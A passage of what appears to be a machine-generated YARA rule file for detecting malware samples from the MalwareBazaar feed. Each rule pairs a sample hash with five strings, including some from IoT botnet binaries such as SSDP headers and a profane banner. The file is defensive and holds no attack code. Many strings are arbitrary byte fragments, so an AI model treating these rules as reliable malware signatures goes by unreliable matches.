        $s5 = "/fj7Vh"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 784KB
        and all of them
}

rule Windows_2739b41aab3ff3cc0727ada7ad04162f0379ef151c7d4b4296e963a2a74891c5
{
    meta:
        description = "Auto ML: 2739b41aab3ff3cc0727ada7ad04162f0379ef151c7d4b4296e963a2a74891c5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "RichlY"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".jidev"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 301KB
        and all of them
}

rule Windows_273a825120c70825c6726ce2c33c9312de4a24fc5a530a52ff8bc95bcd1cea4f
{
    meta:
        description = "Auto ML: 273a825120c70825c6726ce2c33c9312de4a24fc5a530a52ff8bc95bcd1cea4f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Win32 .EXE."
        $s2 = ".MPRESS1"
        $s3 = ".MPRESS22"
        $s4 = ":sK9t}Y"
        $s5 = "VbC?Er"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5504KB
        and all of them
}

rule Windows_2774262a54ea6008d5b508f4d95eb811bd5d7dc50e1c0659d016ab33d966e729
{
    meta:
        description = "Auto ML: 2774262a54ea6008d5b508f4d95eb811bd5d7dc50e1c0659d016ab33d966e729"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "L&&jl66Z~??A"
        $s5 = ";d22Vt::N"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 783KB
        and all of them
}

rule Windows_0341c1348baae5bc2bb53f7c39724eaeaaa929e4d2c11474b267ed064e45f455
{
    meta:
        description = "Auto ML: 0341c1348baae5bc2bb53f7c39724eaeaaa929e4d2c11474b267ed064e45f455"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<>c__DisplayClass1_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 12KB
        and all of them
}

rule Windows_27e2722049ed670474ba068763442df1a11930feb437552454801ebe9e59d59a
{
    meta:
        description = "Auto ML: 27e2722049ed670474ba068763442df1a11930feb437552454801ebe9e59d59a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "qpVC_k@"
        $s5 = "qbVT_q@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 729KB
        and all of them
}

rule Linux_27f88961167dfcc381ab480cd8bce6120fa53795e1bcf7d30f5489c8cef857c3
{
    meta:
        description = "Auto ML: 27f88961167dfcc381ab480cd8bce6120fa53795e1bcf7d30f5489c8cef857c3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/proc/net/route"
        $s2 = "(null)"
        $s3 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS"
        $s4 = "/usr/bin/apt-get"
        $s5 = "Ubuntu"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 89KB
        and all of them
}

rule Windows_2854e234da3cf8855095e1b74f3bb61e5a39ebd534b531f46d875add3eb29312
{
    meta:
        description = "Auto ML: 2854e234da3cf8855095e1b74f3bb61e5a39ebd534b531f46d875add3eb29312"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "Instu`"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 64198KB
        and all of them
}

rule Windows_28bf3281a92f4c95bef7a0b410e4eb1ac4c829732793f6ccdc8cf6002669ea9d
{
    meta:
        description = "Auto ML: 28bf3281a92f4c95bef7a0b410e4eb1ac4c829732793f6ccdc8cf6002669ea9d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Windows_28cd0d3593ae207a9ac7d4cb4ebb6d28293db50e9e5026e703e4bf56a83e7b9b
{
    meta:
        description = "Auto ML: 28cd0d3593ae207a9ac7d4cb4ebb6d28293db50e9e5026e703e4bf56a83e7b9b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<datetimeMenu_SelectedIndexChanged>b__13_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 638KB
        and all of them
}

rule Windows_293b577a8ca51eb4c86e46d28332ee3ed07f9fee2ad938b2a0628d9482b0bfdc
{
    meta:
        description = "Auto ML: 293b577a8ca51eb4c86e46d28332ee3ed07f9fee2ad938b2a0628d9482b0bfdc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6KB
        and all of them
}

rule Linux_294a0e4e151ce90c5934d26e0739fc1afa6157e3f11a38e33adf8f921e34a1f9
{
    meta:
        description = "Auto ML: 294a0e4e151ce90c5934d26e0739fc1afa6157e3f11a38e33adf8f921e34a1f9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 52KB
        and all of them
}

rule Linux_2988e76af76609dbbb8a0fecde150d1b4aeb507096b0eba72ef22e5a8b54baee
{
    meta:
        description = "Auto ML: 2988e76af76609dbbb8a0fecde150d1b4aeb507096b0eba72ef22e5a8b54baee"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ";cpu.u"
        $s2 = "ut9Upw"
        $s3 = "o 9k tC"
        $s4 = "UUUU%UUUU"
        $s5 = "Y 9X s&9A"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 13460KB
        and all of them
}

rule Windows_29af1a36104a0658965ae9fde483b4ca9c5c849e3f2edee8c3e3231c5a7a696a
{
    meta:
        description = "Auto ML: 29af1a36104a0658965ae9fde483b4ca9c5c849e3f2edee8c3e3231c5a7a696a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 370KB
        and all of them
}

rule Windows_29f281cac20928673a516da70a1495cf217aea2dc386d7719de2df7c2053fb9d
{
    meta:
        description = "Auto ML: 29f281cac20928673a516da70a1495cf217aea2dc386d7719de2df7c2053fb9d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "* TFsU*"
        $s5 = "uBrP*s"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5132KB
        and all of them
}

rule Windows_00415d3dbe1002e36e94d9e11459872b7fd485ffc59a4d96a7c8e7e5df80186b
{
    meta:
        description = "Auto ML: 00415d3dbe1002e36e94d9e11459872b7fd485ffc59a4d96a7c8e7e5df80186b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SVWuH3"
        $s5 = "uBhb4@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 239KB
        and all of them
}

rule Windows_035f80e34dc781f15ce459e8e40683ad7e1d9fbd6f7ac4461d6cfde34cc8edb0
{
    meta:
        description = "Auto ML: 035f80e34dc781f15ce459e8e40683ad7e1d9fbd6f7ac4461d6cfde34cc8edb0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "RichlY"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".sidilig"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 301KB
        and all of them
}

rule Windows_2a2e1343b36220e91af7737f576c2204957577bd61694f7fde538a97da9d4994
{
    meta:
        description = "Auto ML: 2a2e1343b36220e91af7737f576c2204957577bd61694f7fde538a97da9d4994"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "G:CvfV"
        $s3 = "\\,VTbm"
        $s4 = "k%jPJo"
        $s5 = "s.f}db"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 683KB
        and all of them
}

rule Linux_2a3e1d32ae10f16c2cb42a29e915ca4776283bc4ee08a7981dd94fafd84d2962
{
    meta:
        description = "Auto ML: 2a3e1d32ae10f16c2cb42a29e915ca4776283bc4ee08a7981dd94fafd84d2962"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "\"zool@0"
        $s2 = "qX8UKW"
        $s3 = "AI]Fgb)+cp"
        $s4 = "GQu-iO"
        $s5 = "k+IIT+"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 57KB
        and all of them
}

rule Windows_2a707ff6a4840639e838d39cc367333bb92da01d39642002c1d26e26889df119
{
    meta:
        description = "Auto ML: 2a707ff6a4840639e838d39cc367333bb92da01d39642002c1d26e26889df119"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "HYYtJHt9H"
        $s5 = "0SSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 704KB
        and all of them
}

rule Linux_2a8d8f5e6738fdbf56c271c971f87a8caf5682d39d33fe12aa99ec4760f06a3a
{
    meta:
        description = "Auto ML: 2a8d8f5e6738fdbf56c271c971f87a8caf5682d39d33fe12aa99ec4760f06a3a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "4:ZYTS"
        $s2 = "D7=$bLr"
        $s3 = "9uS$Iz"
        $s4 = "|9UfYxFp4"
        $s5 = "-'ciGL"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 54KB
        and all of them
}

rule Windows_2aa569b95d506b163ce498b9bb864a28b560029c574b1abd4558016d26a0093d
{
    meta:
        description = "Auto ML: 2aa569b95d506b163ce498b9bb864a28b560029c574b1abd4558016d26a0093d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "#Strings"
        $s4 = "__StaticArrayInitTypeSize=24"
        $s5 = "ToInt64"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 305KB
        and all of them
}

rule Windows_2aef241c8c48579042670ef2dc6f1cf81fb9b83528c00332daae95950e97dd41
{
    meta:
        description = "Auto ML: 2aef241c8c48579042670ef2dc6f1cf81fb9b83528c00332daae95950e97dd41"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "=EyF_S"
        $s5 = "I5JZ44K8EG5GZST7HE57QR7"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 696KB
        and all of them
}

rule Windows_2ba1dac82b3bf5323019fc2518ba2d1cadf1b09f4c258a6b2cc794740b61aba8
{
    meta:
        description = "Auto ML: 2ba1dac82b3bf5323019fc2518ba2d1cadf1b09f4c258a6b2cc794740b61aba8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5775KB
        and all of them
}

rule Windows_2ba23a256551d2b59785b96b6e2b79b3a1a63c3e634b6a1e2690d48c8450e80a
{
    meta:
        description = "Auto ML: 2ba23a256551d2b59785b96b6e2b79b3a1a63c3e634b6a1e2690d48c8450e80a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "#Strings"
        $s4 = "IEnumerable`1"
        $s5 = "ToInt32"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 595KB
        and all of them
}

rule Windows_2bceb15676d4f690c8ec549d40177cc5dd63124d44b6ebb8d1fb87adb9c514d1
{
    meta:
        description = "Auto ML: 2bceb15676d4f690c8ec549d40177cc5dd63124d44b6ebb8d1fb87adb9c514d1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "2e6OS\\G2T"
        $s5 = "DlaFGW5"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3542KB
        and all of them
}

rule Windows_2bf67ccbf4e114d641eaa81a07ccf19e248ab9008d2c3d77a5be1ce937dd0e92
{
    meta:
        description = "Auto ML: 2bf67ccbf4e114d641eaa81a07ccf19e248ab9008d2c3d77a5be1ce937dd0e92"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Nullable`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 831KB
        and all of them
}

rule Windows_0360c06603e86eba76a783ed1599f900dbe465c99fbc44bc7c86062303d88a6b
{
    meta:
        description = "Auto ML: 0360c06603e86eba76a783ed1599f900dbe465c99fbc44bc7c86062303d88a6b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 321KB
        and all of them
}

rule Windows_2c009fefcf337b8b5e4f0249aeb1627d3a39934097cf5fea75b16c5aa9a7f374
{
    meta:
        description = "Auto ML: 2c009fefcf337b8b5e4f0249aeb1627d3a39934097cf5fea75b16c5aa9a7f374"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "NjqD-N"
        $s5 = "oLbJDf"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7988KB
        and all of them
}

rule Windows_2c32eace1b05663b289ea1ac4dc8a8934d693ee1fc1e178ed1f8052dbb3f3b98
{
    meta:
        description = "Auto ML: 2c32eace1b05663b289ea1ac4dc8a8934d693ee1fc1e178ed1f8052dbb3f3b98"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "RichlY"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".mewig"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 305KB
        and all of them
}

rule Linux_2c683501e18c3e736ad71552757f6e79564f0a0942a51ad8a208c291b5918dfd
{
    meta:
        description = "Auto ML: 2c683501e18c3e736ad71552757f6e79564f0a0942a51ad8a208c291b5918dfd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/proc/net/route"
        $s2 = "(null)"
        $s3 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS"
        $s4 = "/usr/bin/apt-get"
        $s5 = "Ubuntu"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 105KB
        and all of them
}

rule Linux_2c94de84088e1ebc5b4fd4a32fbe6b2f4b9526aa0ebf8a4b534a06a016b460e5
{
    meta:
        description = "Auto ML: 2c94de84088e1ebc5b4fd4a32fbe6b2f4b9526aa0ebf8a4b534a06a016b460e5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/lib/ld-uClibc.so.0"
        $s2 = "libc.so.0"
        $s3 = "strcpy"
        $s4 = "connect"
        $s5 = "sigemptyset"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 62KB
        and all of them
}

rule Windows_2cab1566a89734389b4cdf0e311d947a7c64c62bd9557cd72f5921fc721432e4
{
    meta:
        description = "Auto ML: 2cab1566a89734389b4cdf0e311d947a7c64c62bd9557cd72f5921fc721432e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "Boolean"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1259KB
        and all of them
}

rule Windows_2d05f675e7c06601137fb08a475d8f0483847a3ec9b296952c7045fc1b6be689
{
    meta:
        description = "Auto ML: 2d05f675e7c06601137fb08a475d8f0483847a3ec9b296952c7045fc1b6be689"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "RichlY"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".suzeme"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 204KB
        and all of them
}

rule Windows_2d4e78ac81b6f5f1c75db900ac1bd0f2dbd22918808694977565b6bf436d827d
{
    meta:
        description = "Auto ML: 2d4e78ac81b6f5f1c75db900ac1bd0f2dbd22918808694977565b6bf436d827d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label100"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 812KB
        and all of them
}

rule Windows_2d9a0704386d3f8838cb40d5f22952c2708e98cb9e359e0c3e106b617c26de64
{
    meta:
        description = "Auto ML: 2d9a0704386d3f8838cb40d5f22952c2708e98cb9e359e0c3e106b617c26de64"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Calculate>b__0_0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 634KB
        and all of them
}

rule Linux_2ddbb4fb5b044685b0c395f1bc585167d4093cff951a404e450c8e11849bf026
{
    meta:
        description = "Auto ML: 2ddbb4fb5b044685b0c395f1bc585167d4093cff951a404e450c8e11849bf026"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 203KB
        and all of them
}

rule Windows_2dfc49dd156ddbc9999f327d2577ecb7f573f15bd03903f3795e1319d21b0ec3
{
    meta:
        description = "Auto ML: 2dfc49dd156ddbc9999f327d2577ecb7f573f15bd03903f3795e1319d21b0ec3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".jukur"
        $s5 = "HHtXHHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 294KB
        and all of them
}

rule Linux_03888813079d01e1ba2d2675cf35724e529d58a78b9efd8161c746e8e33c643d
{
    meta:
        description = "Auto ML: 03888813079d01e1ba2d2675cf35724e529d58a78b9efd8161c746e8e33c643d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "2Gc8wI21pCHVU13m-f9I/5ec7gqW4Ss8OdTNo85Xn/TE8qvHqEcXAdNjDZ-aIP/lN_XHtw5bJfBWp7-b4f5"
        $s2 = ";cpu.u"
        $s3 = "ut9Upw"
        $s4 = "o 9k tC"
        $s5 = "UUUU%UUUU"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 4480KB
        and all of them
}

rule Windows_2e08721f791305935eb167081cc4dc13b58297d3810ef998026c7a0a59f00f40
{
    meta:
        description = "Auto ML: 2e08721f791305935eb167081cc4dc13b58297d3810ef998026c7a0a59f00f40"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "RichlY"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".navikil"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 302KB
        and all of them
}

rule Windows_2e0ffaab995f22b7684052e53b8c64b9283b5e81503b88664785fe6d6569a55e
{
    meta:
        description = "Auto ML: 2e0ffaab995f22b7684052e53b8c64b9283b5e81503b88664785fe6d6569a55e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode.$"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@.retplne"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 16138KB
        and all of them
}

rule Linux_2eb4a525dd3c839e2e3641694d1061eb361fa6e9ada59fcb576669114ef75653
{
    meta:
        description = "Auto ML: 2eb4a525dd3c839e2e3641694d1061eb361fa6e9ada59fcb576669114ef75653"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Lds`La"
        $s2 = "APe|l3j"
        $s3 = "AmH|g;\"'"
        $s4 = "Q]cln\\"
        $s5 = "R#ay!p1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB
        and all of them
}

rule Linux_2eecf28243d6d408618437ea849b67a504e2255082e36ba385f87f7b68d79f43
{
    meta:
        description = "Auto ML: 2eecf28243d6d408618437ea849b67a504e2255082e36ba385f87f7b68d79f43"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "a qb!q"
        $s2 = "c4s2a1R"
        $s3 = "R)B3gCh"
        $s4 = "/\"OBQDV"
        $s5 = "ChCaLq"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 79KB
        and all of them
}

rule Linux_2efc3095f61099305983fdfd31180a4e3b2f097c125b5a7f4b798d52cc0ebc28
{
    meta:
        description = "Auto ML: 2efc3095f61099305983fdfd31180a4e3b2f097c125b5a7f4b798d52cc0ebc28"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "zn]BDL"
        $s2 = "`Kwo}OY"
        $s3 = "/xyd`O"
        $s4 = "uEH;1s"
        $s5 = "g ,Kqu#."

    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB
        and all of them
}

rule Windows_2f511d2b5082a059bbc56ddd78b3a2dbe221941f70b42d1e7740dbdcd4a5be12
{
    meta:
        description = "Auto ML: 2f511d2b5082a059bbc56ddd78b3a2dbe221941f70b42d1e7740dbdcd4a5be12"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Windows_2f9bf1b8e047c1fa8ec80deccb3e9b575aaf5247f23c0fea81157b8b995562c9
{
    meta:
        description = "Auto ML: 2f9bf1b8e047c1fa8ec80deccb3e9b575aaf5247f23c0fea81157b8b995562c9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".didat"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1523KB
        and all of them
}

rule Windows_2fcad226b17131da4274e1b9f8f31359bdd325c9568665f08fd1f6c5d06a23ce
{
    meta:
        description = "Auto ML: 2fcad226b17131da4274e1b9f8f31359bdd325c9568665f08fd1f6c5d06a23ce"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "_Lambda$__4-0"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 11KB
        and all of them
}

rule Windows_2fcb6730a335fe6f41ba9d12579bdadbdc9655290132da53a4864f475a55dee9
{
    meta:
        description = "Auto ML: 2fcb6730a335fe6f41ba9d12579bdadbdc9655290132da53a4864f475a55dee9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "d UUUU_`"
        $s5 = "lZ[YZ*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 828KB
        and all of them
}

rule Linux_2fcc3a77545e68783533dc61490c9678a683e97ba3a043dd7c07ea6a4fb2944d
{
    meta:
        description = "Auto ML: 2fcc3a77545e68783533dc61490c9678a683e97ba3a043dd7c07ea6a4fb2944d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "CvUPX!"
        $s2 = "-o;XY=E"
        $s3 = "ah|ez$"
        $s4 = "mZKQH1"
        $s5 = "Ul%a{Zo"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 32KB
        and all of them
}

